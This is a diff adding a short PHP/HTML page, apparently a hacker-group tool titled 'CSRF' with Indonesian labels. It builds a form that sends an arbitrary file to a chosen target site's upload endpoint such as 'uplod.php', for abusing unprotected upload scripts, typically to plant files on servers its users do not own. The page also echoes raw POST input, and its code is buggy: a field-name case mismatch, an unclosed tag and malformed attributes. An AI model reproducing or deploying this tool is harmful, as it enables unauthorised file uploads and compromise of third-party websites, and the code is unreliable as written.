@@ -1,0 +1,38 @@
+<html>
+<head>
+<title>CSRF</title>
+</head>
+<center>
+<body bgcolor="white">
+<font size="7" color="#A50604" face="Orbitron" style="text-transform:1px 0px 5px red;">/taliacans/</font>
+<br>
+<font color="blue">
+	---------------------------------------------------------------------------------------------------------------------------
+</font>
+<br>
+<font size="3" color="red"> BY ROBH OFFICIAL </font>
+<br>
+<font color="blue">
+	---------------------------------------------------------------------------------------------------------------------------
+</font><br>
+<img src="https://h.top4top.io/p_1569s6pzz1.jpg" size="200">
+<form method="post">
+<font size="7" color="black face="wallpoet style="text-shadow: 1px 0px 5px lime;">
+	URL: <input type="text" name="url" size="60" height="10" placeholder="http://www.target.com/[path]/uplod.php" 
+	style="margin: 5px auto; padding-right:5px;" required><br>
+	POST FILE: <input type="text" name="pf" size="50" height="10" placeholder="filedata / files[] / qqfile / userfile / dll" style="mask-type: 5px auto; padding-top: 5px" required><br></font>
+	<input type="submit" name="d" value="KUNCI TARGET NYA OM">
+</form>
+<?php
+$url = $_POST['URL'];
+$pf = $_POST ['pf'];
+$d = $_POST ['d'];
+if ($d) {
+	    echo "<form method='post' target='_blank' action= '$url' enctype ='multipart/form-data'><input type ='file' name='$pf'><input type='submit' name='g'; value='tarik mhank'></form";
+	}
+	?>
+</form>
+</center>
+</body>
+<html>
+<!--- by talia --->
